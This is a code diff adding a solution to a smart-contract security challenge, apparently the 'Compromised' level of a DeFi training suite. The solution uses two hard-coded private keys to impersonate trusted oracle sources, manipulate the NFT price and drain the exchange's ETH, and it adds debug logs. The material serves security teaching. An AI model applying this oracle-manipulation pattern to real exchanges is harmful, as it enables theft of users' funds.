@@ -76,6 +76,43 @@ contract Compromised is Test {
         /**
          * EXPLOIT START *
          */
+        address privateKey1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
+        address privateKey2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);
+        console.log("!!!!!!!!!!!!!!!!!!!", trustfulOracle.hasRole(keccak256("TRUSTED_SOURCE_ROLE"), privateKey1));
+        vm.prank(privateKey1);
+        trustfulOracle.postPrice("DVNFT", 1);
+        vm.prank(privateKey2);
+        trustfulOracle.postPrice("DVNFT", 1);
+        console.log(trustfulOracle.getMedianPrice("DVNFT"), "aaaaaaaaaaaaaaaaaaaaaasd", address(exchange).balance);
+        uint256 lastone;
+        uint256[] memory templ = new uint[](10);
+        for (uint256 i = 0; i < 10; i++) {
+            vm.prank(attacker);
+            uint256 tkid = exchange.buyOne{value: 1}();
+            templ[i] = tkid;
+        }
+
+        vm.prank(attacker);
+        lastone = exchange.buyOne{value: 1}();
+        vm.prank(privateKey1);
+        trustfulOracle.postPrice("DVNFT", 11);
+        vm.prank(privateKey2);
+        trustfulOracle.postPrice("DVNFT", 11);
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), lastone);
+        exchange.sellOne(lastone);
+        vm.stopPrank();
+        vm.prank(privateKey1);
+        trustfulOracle.postPrice("DVNFT", 999 ether);
+        vm.prank(privateKey2);
+        trustfulOracle.postPrice("DVNFT", 999 ether);
+
+        for (uint256 i = 0; i < 10; i++) {
+            vm.startPrank(attacker);
+            damnValuableNFT.approve(address(exchange), templ[i]);
+            exchange.sellOne(templ[i]);
+            vm.stopPrank();
+        }
 
         /**
          * EXPLOIT END *
@@ -86,15 +123,19 @@ contract Compromised is Test {
 
     function validation() internal {
         // Exchange must have lost all ETH
+        console.log("deve esse 0 ma ", address(exchange).balance);
         assertEq(address(exchange).balance, 0);
 
         // Attacker's ETH balance must have significantly increased
+        console.log("deve esse 9990eth ma ", attacker.balance);
         assertGt(attacker.balance, EXCHANGE_INITIAL_ETH_BALANCE);
 
         // Attacker must not own any NFT
+        console.log("deve esse 0 ma ", damnValuableNFT.balanceOf(attacker));
         assertEq(damnValuableNFT.balanceOf(attacker), 0);
 
         // NFT price shouldn't have changed
+        console.log("deve esse 999eth ma ", trustfulOracle.getMedianPrice("DVNFT"));
         assertEq(trustfulOracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
     }
 }
